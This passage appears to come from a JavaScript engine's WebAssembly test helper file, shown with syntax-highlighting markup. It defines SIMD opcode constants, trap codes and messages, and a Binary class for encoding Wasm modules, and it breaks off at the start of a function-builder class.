<span class="hljs-keyword">let</span> kExprI32x4ExtMulLowI16x8S = <span class="hljs-number">0xbc</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulHighI16x8S = <span class="hljs-number">0xbd</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulLowI16x8U = <span class="hljs-number">0xbe</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulHighI16x8U = <span class="hljs-number">0xbf</span>;
<span class="hljs-keyword">let</span> kExprI64x2Abs = <span class="hljs-number">0xc0</span>;
<span class="hljs-keyword">let</span> kExprI64x2Neg = <span class="hljs-number">0xc1</span>;
<span class="hljs-keyword">let</span> kExprI64x2AllTrue = <span class="hljs-number">0xc3</span>;
<span class="hljs-keyword">let</span> kExprI64x2BitMask = <span class="hljs-number">0xc4</span>;
<span class="hljs-keyword">let</span> kExprI64x2SConvertI32x4Low = <span class="hljs-number">0xc7</span>;
<span class="hljs-keyword">let</span> kExprI64x2SConvertI32x4High = <span class="hljs-number">0xc8</span>;
<span class="hljs-keyword">let</span> kExprI64x2UConvertI32x4Low = <span class="hljs-number">0xc9</span>;
<span class="hljs-keyword">let</span> kExprI64x2UConvertI32x4High = <span class="hljs-number">0xca</span>;
<span class="hljs-keyword">let</span> kExprI64x2Shl = <span class="hljs-number">0xcb</span>;
<span class="hljs-keyword">let</span> kExprI64x2ShrS = <span class="hljs-number">0xcc</span>;
<span class="hljs-keyword">let</span> kExprI64x2ShrU = <span class="hljs-number">0xcd</span>;
<span class="hljs-keyword">let</span> kExprI64x2Add = <span class="hljs-number">0xce</span>;
<span class="hljs-keyword">let</span> kExprI64x2Sub = <span class="hljs-number">0xd1</span>;
<span class="hljs-keyword">let</span> kExprI64x2Mul = <span class="hljs-number">0xd5</span>;
<span class="hljs-keyword">let</span> kExprI64x2Eq = <span class="hljs-number">0xd6</span>;
<span class="hljs-keyword">let</span> kExprI64x2Ne = <span class="hljs-number">0xd7</span>;
<span class="hljs-keyword">let</span> kExprI64x2LtS = <span class="hljs-number">0xd8</span>;
<span class="hljs-keyword">let</span> kExprI64x2GtS = <span class="hljs-number">0xd9</span>;
<span class="hljs-keyword">let</span> kExprI64x2LeS = <span class="hljs-number">0xda</span>;
<span class="hljs-keyword">let</span> kExprI64x2GeS = <span class="hljs-number">0xdb</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulLowI32x4S = <span class="hljs-number">0xdc</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulHighI32x4S = <span class="hljs-number">0xdd</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulLowI32x4U = <span class="hljs-number">0xde</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulHighI32x4U = <span class="hljs-number">0xdf</span>;
<span class="hljs-keyword">let</span> kExprF32x4Abs = <span class="hljs-number">0xe0</span>;
<span class="hljs-keyword">let</span> kExprF32x4Neg = <span class="hljs-number">0xe1</span>;
<span class="hljs-keyword">let</span> kExprF32x4Sqrt = <span class="hljs-number">0xe3</span>;
<span class="hljs-keyword">let</span> kExprF32x4Add = <span class="hljs-number">0xe4</span>;
<span class="hljs-keyword">let</span> kExprF32x4Sub = <span class="hljs-number">0xe5</span>;
<span class="hljs-keyword">let</span> kExprF32x4Mul = <span class="hljs-number">0xe6</span>;
<span class="hljs-keyword">let</span> kExprF32x4Div = <span class="hljs-number">0xe7</span>;
<span class="hljs-keyword">let</span> kExprF32x4Min = <span class="hljs-number">0xe8</span>;
<span class="hljs-keyword">let</span> kExprF32x4Max = <span class="hljs-number">0xe9</span>;
<span class="hljs-keyword">let</span> kExprF32x4Pmin = <span class="hljs-number">0xea</span>;
<span class="hljs-keyword">let</span> kExprF32x4Pmax = <span class="hljs-number">0xeb</span>;
<span class="hljs-keyword">let</span> kExprF64x2Abs = <span class="hljs-number">0xec</span>;
<span class="hljs-keyword">let</span> kExprF64x2Neg = <span class="hljs-number">0xed</span>;
<span class="hljs-keyword">let</span> kExprF64x2Sqrt = <span class="hljs-number">0xef</span>;
<span class="hljs-keyword">let</span> kExprF64x2Add = <span class="hljs-number">0xf0</span>;
<span class="hljs-keyword">let</span> kExprF64x2Sub = <span class="hljs-number">0xf1</span>;
<span class="hljs-keyword">let</span> kExprF64x2Mul = <span class="hljs-number">0xf2</span>;
<span class="hljs-keyword">let</span> kExprF64x2Div = <span class="hljs-number">0xf3</span>;
<span class="hljs-keyword">let</span> kExprF64x2Min = <span class="hljs-number">0xf4</span>;
<span class="hljs-keyword">let</span> kExprF64x2Max = <span class="hljs-number">0xf5</span>;
<span class="hljs-keyword">let</span> kExprF64x2Pmin = <span class="hljs-number">0xf6</span>;
<span class="hljs-keyword">let</span> kExprF64x2Pmax = <span class="hljs-number">0xf7</span>;
<span class="hljs-keyword">let</span> kExprI32x4SConvertF32x4 = <span class="hljs-number">0xf8</span>;
<span class="hljs-keyword">let</span> kExprI32x4UConvertF32x4 = <span class="hljs-number">0xf9</span>;
<span class="hljs-keyword">let</span> kExprF32x4SConvertI32x4 = <span class="hljs-number">0xfa</span>;
<span class="hljs-keyword">let</span> kExprF32x4UConvertI32x4 = <span class="hljs-number">0xfb</span>;
<span class="hljs-keyword">let</span> kExprI32x4TruncSatF64x2SZero = <span class="hljs-number">0xfc</span>;
<span class="hljs-keyword">let</span> kExprI32x4TruncSatF64x2UZero = <span class="hljs-number">0xfd</span>;
<span class="hljs-keyword">let</span> kExprF64x2ConvertLowI32x4S = <span class="hljs-number">0xfe</span>;
<span class="hljs-keyword">let</span> kExprF64x2ConvertLowI32x4U = <span class="hljs-number">0xff</span>;

<span class="hljs-comment">// Relaxed SIMD.</span>
<span class="hljs-keyword">let</span> kExprI8x16RelaxedSwizzle = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x100</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF32x4S = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x101</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF32x4U = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x102</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF64x2SZero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x103</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF64x2UZero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x104</span>);
<span class="hljs-keyword">let</span> kExprF32x4Qfma = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x105</span>);
<span class="hljs-keyword">let</span> kExprF32x4Qfms = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x106</span>);
<span class="hljs-keyword">let</span> kExprF64x2Qfma = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x107</span>);
<span class="hljs-keyword">let</span> kExprF64x2Qfms = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x108</span>);
<span class="hljs-keyword">let</span> kExprI8x16RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x109</span>);
<span class="hljs-keyword">let</span> kExprI16x8RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10a</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10b</span>);
<span class="hljs-keyword">let</span> kExprI64x2RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10c</span>);
<span class="hljs-keyword">let</span> kExprF32x4RelaxedMin = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10d</span>);
<span class="hljs-keyword">let</span> kExprF32x4RelaxedMax = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10e</span>);
<span class="hljs-keyword">let</span> kExprF64x2RelaxedMin = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10f</span>);
<span class="hljs-keyword">let</span> kExprF64x2RelaxedMax = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x110</span>);
<span class="hljs-keyword">let</span> kExprI16x8RelaxedQ15MulRS = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x111</span>);
<span class="hljs-keyword">let</span> kExprI16x8DotI8x16I7x16S = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x112</span>);
<span class="hljs-keyword">let</span> kExprI32x4DotI8x16I7x16AddS = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x113</span>);

<span class="hljs-comment">// FP16 SIMD</span>
<span class="hljs-keyword">let</span> kExprF16x8Splat = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x120</span>);
<span class="hljs-keyword">let</span> kExprF16x8ExtractLane = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x121</span>);
<span class="hljs-keyword">let</span> kExprF16x8ReplaceLane = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x122</span>);
<span class="hljs-keyword">let</span> kExprF16x8Abs = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x130</span>);
<span class="hljs-keyword">let</span> kExprF16x8Neg = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x131</span>);
<span class="hljs-keyword">let</span> kExprF16x8Sqrt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x132</span>);
<span class="hljs-keyword">let</span> kExprF16x8Ceil = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x133</span>);
<span class="hljs-keyword">let</span> kExprF16x8Floor = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x134</span>);
<span class="hljs-keyword">let</span> kExprF16x8Trunc = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x135</span>);
<span class="hljs-keyword">let</span> kExprF16x8NearestInt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x136</span>);
<span class="hljs-keyword">let</span> kExprF16x8Eq = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x137</span>);
<span class="hljs-keyword">let</span> kExprF16x8Ne = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x138</span>);
<span class="hljs-keyword">let</span> kExprF16x8Lt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x139</span>);
<span class="hljs-keyword">let</span> kExprF16x8Gt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13a</span>);
<span class="hljs-keyword">let</span> kExprF16x8Le = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13b</span>);
<span class="hljs-keyword">let</span> kExprF16x8Ge = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13c</span>);
<span class="hljs-keyword">let</span> kExprF16x8Add = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13d</span>);
<span class="hljs-keyword">let</span> kExprF16x8Sub = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13e</span>);
<span class="hljs-keyword">let</span> kExprF16x8Mul = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13f</span>);
<span class="hljs-keyword">let</span> kExprF16x8Div = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x140</span>);
<span class="hljs-keyword">let</span> kExprF16x8Min = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x141</span>);
<span class="hljs-keyword">let</span> kExprF16x8Max = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x142</span>);
<span class="hljs-keyword">let</span> kExprF16x8Pmin = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x143</span>);
<span class="hljs-keyword">let</span> kExprF16x8Pmax = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x144</span>);
<span class="hljs-keyword">let</span> kExprI16x8SConvertF16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x145</span>);
<span class="hljs-keyword">let</span> kExprI16x8UConvertF16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x146</span>);
<span class="hljs-keyword">let</span> kExprF16x8SConvertI16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x147</span>);
<span class="hljs-keyword">let</span> kExprF16x8UConvertI16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x148</span>);
<span class="hljs-keyword">let</span> kExprF16x8DemoteF32x4Zero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x149</span>);
<span class="hljs-keyword">let</span> kExprF16x8DemoteF64x2Zero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14a</span>);
<span class="hljs-keyword">let</span> kExprF32x4PromoteLowF16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14b</span>);
<span class="hljs-keyword">let</span> kExprF16x8Qfma = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14e</span>);
<span class="hljs-keyword">let</span> kExprF16x8Qfms = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14f</span>);

<span class="hljs-keyword">let</span> kTrapUnreachable = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kTrapMemOutOfBounds = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kTrapDivByZero = <span class="hljs-number">2</span>;
<span class="hljs-keyword">let</span> kTrapDivUnrepresentable = <span class="hljs-number">3</span>;
<span class="hljs-keyword">let</span> kTrapRemByZero = <span class="hljs-number">4</span>;
<span class="hljs-keyword">let</span> kTrapFloatUnrepresentable = <span class="hljs-number">5</span>;
<span class="hljs-keyword">let</span> kTrapTableOutOfBounds = <span class="hljs-number">6</span>;
<span class="hljs-keyword">let</span> kTrapNullFunc = <span class="hljs-number">7</span>;
<span class="hljs-keyword">let</span> kTrapFuncSigMismatch = <span class="hljs-number">8</span>;
<span class="hljs-keyword">let</span> kTrapUnalignedAccess = <span class="hljs-number">9</span>;
<span class="hljs-keyword">let</span> kTrapDataSegmentOutOfBounds = <span class="hljs-number">10</span>;
<span class="hljs-keyword">let</span> kTrapElementSegmentOutOfBounds = <span class="hljs-number">11</span>;
<span class="hljs-keyword">let</span> kTrapRethrowNull = <span class="hljs-number">12</span>;
<span class="hljs-keyword">let</span> kTrapArrayTooLarge = <span class="hljs-number">13</span>;
<span class="hljs-keyword">let</span> kTrapArrayOutOfBounds = <span class="hljs-number">14</span>;
<span class="hljs-keyword">let</span> kTrapNullDereference = <span class="hljs-number">15</span>;
<span class="hljs-keyword">let</span> kTrapIllegalCast = <span class="hljs-number">16</span>;

<span class="hljs-keyword">let</span> kAtomicWaitOk = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kAtomicWaitNotEqual = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kAtomicWaitTimedOut = <span class="hljs-number">2</span>;

<span class="hljs-comment">// Exception handling with exnref.</span>
<span class="hljs-keyword">let</span> kCatchNoRef = <span class="hljs-number">0x0</span>;
<span class="hljs-keyword">let</span> kCatchRef = <span class="hljs-number">0x1</span>;
<span class="hljs-keyword">let</span> kCatchAllNoRef = <span class="hljs-number">0x2</span>;
<span class="hljs-keyword">let</span> kCatchAllRef = <span class="hljs-number">0x3</span>;

<span class="hljs-comment">// Stack switching handler kinds.</span>
<span class="hljs-keyword">let</span> kOnSuspend = <span class="hljs-number">0x0</span>;
<span class="hljs-keyword">let</span> kOnSwitch = <span class="hljs-number">0x1</span>;

<span class="hljs-keyword">let</span> kTrapMsgs = [
  <span class="hljs-string">&#x27;unreachable&#x27;</span>,                                    <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;memory access out of bounds&#x27;</span>,                    <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;divide by zero&#x27;</span>,                                 <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;divide result unrepresentable&#x27;</span>,                  <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;remainder by zero&#x27;</span>,                              <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;float unrepresentable in integer range&#x27;</span>,         <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;table index is out of bounds&#x27;</span>,                   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;null function&#x27;</span>,   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;function signature mismatch&#x27;</span>,   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;operation does not support unaligned accesses&#x27;</span>,  <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;data segment out of bounds&#x27;</span>,                     <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;element segment out of bounds&#x27;</span>,                  <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;rethrowing null value&#x27;</span>,                          <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;requested new array is too large&#x27;</span>,               <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;array element access out of bounds&#x27;</span>,             <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;dereferencing a null pointer&#x27;</span>,                   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;illegal cast&#x27;</span>,                                   <span class="hljs-comment">// --</span>
];

<span class="hljs-comment">// This requires test/mjsunit/mjsunit.js.</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">assertTraps</span>(<span class="hljs-params">trap, code</span>) {
  <span class="hljs-title function_">assertThrows</span>(code, <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-property">RuntimeError</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(kTrapMsgs[trap]));
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">assertTrapsOneOf</span>(<span class="hljs-params">traps, code</span>) {
  <span class="hljs-keyword">const</span> errorChecker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(
    <span class="hljs-string">&#x27;(&#x27;</span> + traps.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">trap</span> =&gt;</span> kTrapMsgs[trap]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;|&#x27;</span>) + <span class="hljs-string">&#x27;)&#x27;</span>
  );
  <span class="hljs-title function_">assertThrows</span>(code, <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-property">RuntimeError</span>, errorChecker);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Binary</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">8192</span>);
  }

  <span class="hljs-title function_">ensure_space</span>(<span class="hljs-params">needed</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-property">length</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> &gt;= needed) <span class="hljs-keyword">return</span>;
    <span class="hljs-keyword">let</span> new_capacity = <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-property">length</span> * <span class="hljs-number">2</span>;
    <span class="hljs-keyword">while</span> (new_capacity - <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> &lt; needed) new_capacity *= <span class="hljs-number">2</span>;
    <span class="hljs-keyword">let</span> new_buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(new_capacity);
    new_buffer.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = new_buffer;
  }

  <span class="hljs-title function_">trunc_buffer</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-property">buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>);
  }

  <span class="hljs-title function_">reset</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">emit_u8</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(<span class="hljs-number">1</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val;
  }

  <span class="hljs-title function_">emit_u16</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(<span class="hljs-number">2</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">8</span>;
  }

  <span class="hljs-title function_">emit_u32</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(<span class="hljs-number">4</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">8</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">16</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">24</span>;
  }

  <span class="hljs-title function_">emit_leb_u</span>(<span class="hljs-params">val, max_len</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(max_len);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; max_len; ++i) {
      <span class="hljs-keyword">let</span> v = val &amp; <span class="hljs-number">0xff</span>;
      val = val &gt;&gt;&gt; <span class="hljs-number">7</span>;
      <span class="hljs-keyword">if</span> (val == <span class="hljs-number">0</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = v;
        <span class="hljs-keyword">return</span>;
      }
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = v | <span class="hljs-number">0x80</span>;
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Leb value exceeds maximum length of &#x27;</span> + max_len);
  }

  <span class="hljs-title function_">emit_u32v</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_leb_u</span>(val, kMaxVarInt32Size);
  }

  <span class="hljs-title function_">emit_u64v</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_leb_u</span>(val, kMaxVarInt64Size);
  }

  <span class="hljs-title function_">emit_bytes</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(data.<span class="hljs-property">length</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-title function_">set</span>(data, <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> += data.<span class="hljs-property">length</span>;
  }

  <span class="hljs-title function_">emit_string</span>(<span class="hljs-params">string</span>) {
    <span class="hljs-comment">// When testing illegal names, we pass a byte array directly.</span>
    <span class="hljs-keyword">if</span> (string <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u32v</span>(string.<span class="hljs-property">length</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(string);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// This is the hacky way to convert a JavaScript string to a UTF8 encoded</span>
    <span class="hljs-comment">// string only containing single-byte characters.</span>
    <span class="hljs-keyword">let</span> string_utf8 = <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">encodeURIComponent</span>(string));
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u32v</span>(string_utf8.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; string_utf8.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(string_utf8.<span class="hljs-title function_">charCodeAt</span>(i));
    }
  }

  <span class="hljs-title function_">emit_heap_type</span>(<span class="hljs-params">heap_type</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(<span class="hljs-title function_">wasmSignedLeb</span>(heap_type, kMaxVarInt32Size));
  }

  <span class="hljs-title function_">emit_type</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(type &gt;= <span class="hljs-number">0</span> ? type : type &amp; kLeb128Mask);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(type.<span class="hljs-property">opcode</span>);
      <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_shared</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(kWasmSharedTypeForm);
      <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_exact</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(kWasmExact);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_heap_type</span>(type.<span class="hljs-property">heap_type</span>);
    }
  }

  <span class="hljs-title function_">emit_init_expr</span>(<span class="hljs-params">expr</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(expr);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(kExprEnd);
  }

  <span class="hljs-title function_">emit_header</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>([
      kWasmH0, kWasmH1, kWasmH2, kWasmH3, kWasmV0, kWasmV1, kWasmV2, kWasmV3
    ]);
  }

  <span class="hljs-title function_">emit_section</span>(<span class="hljs-params">section_code, content_generator</span>) {
    <span class="hljs-comment">// Emit section name.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(section_code);
    <span class="hljs-comment">// Emit the section to a temporary buffer: its full length isn&#x27;t know yet.</span>
    <span class="hljs-keyword">const</span> section = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>;
    <span class="hljs-title function_">content_generator</span>(section);
    <span class="hljs-comment">// Emit section length.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u32v</span>(section.<span class="hljs-property">length</span>);
    <span class="hljs-comment">// Copy the temporary buffer.</span>
    <span class="hljs-comment">// Avoid spread because {section} can be huge.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(section.<span class="hljs-title function_">trunc_buffer</span>());
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmFunctionBuilder</span> {
  <span class="hljs-comment">// Encoding of local names: a string corresponds to a local name,</span>
  <span class="hljs-comment">// a number n corresponds to n undefined names.</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type_index, arg_names</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span> = <span class="hljs-variable language_">module</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_index</span> = type_index;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">locals</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span> = arg_names;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body_offset</span> = <span class="hljs-literal">undefined</span>;  <span class="hljs-comment">// Not valid until module is serialized.</span>
  }

  <span class="hljs-title function_">numLocalNames</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">let</span> num_local_names = <span class="hljs-number">0</span>;
